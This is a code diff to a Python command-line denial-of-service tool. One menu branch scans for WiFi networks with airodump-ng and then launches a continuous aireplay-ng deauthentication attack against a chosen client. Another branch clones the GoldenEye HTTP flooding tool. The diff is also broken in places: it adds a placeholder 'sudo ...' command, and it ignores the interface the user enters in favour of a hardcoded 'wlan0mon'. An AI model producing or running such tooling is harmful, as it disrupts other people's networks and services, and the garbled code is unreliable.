@@ -34,6 +34,7 @@ clear()
 dos_banner()
 
 while True:
+    
     dos_choice = input("dos>> ").strip().lower()
     if dos_choice in ("h", "help"):
         dos_menu()
@@ -46,12 +47,21 @@ while True:
             subprocess.run(("sudo", "airodump-ng", intrfc))
         except KeyboardInterrupt:
             print("\nStopped Scanning, continue...\n")
-            intrfc2 = input("Enter monitor-mode interface (e.g. wlan0mon) >> ")
+            intrfc2 = None
+            try:
+                subprocess.run(("sudo", "..."))
+            except KeyboardInterrupt:
+                intrfc2 = input("Enter monitor-mode interface >> ")
+
+            if not intrfc2:
+                print("No interface provided, returning to menu.")
+                continue
+
         wifimac = input("Enter WiFi's mac>> ")
         wifichannel = input("Enter WiFi's channel ID>> ")
-        subprocess.run(("sudo", "airodump-ng", "--bssid", wifimac, "-c", wifichannel, intrfc2))
-        wifitarget = input("Enter target's mac address")
-        subprocess.run(("sudo", "aireplay-ng", "--deauth", "0", "-a", wifimac, "-c", wifitarget, intrfc2))
+        subprocess.run(("sudo", "airodump-ng", "--bssid", wifimac, "-c", wifichannel, "wlan0mon"))
+        wifitarget = input("Enter target's mac address>> ")
+        subprocess.run(("sudo", "aireplay-ng", "--deauth", "0", "-a", wifimac, "-c", wifitarget, "wlan0mon"))
 
     elif dos_choice in ("2", "goldeneye"):
         subprocess.run(("git", "clone", "https://github.com/jseidl/GoldenEye", "goldeneye"))
